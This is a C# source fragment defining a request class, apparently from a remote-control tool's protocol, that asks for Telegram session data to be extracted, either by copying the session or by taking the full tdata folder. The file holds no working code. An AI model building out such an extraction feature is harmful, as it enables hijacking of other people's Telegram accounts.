using System;

namespace RemoteControl.Protocals.Request
{
    public class RequestTGExtract
    {
        /// <summary>
        /// 提取模式: 0=session复制, 1=完整tdata
        /// </summary>
        public int Mode = 0;
    }
}
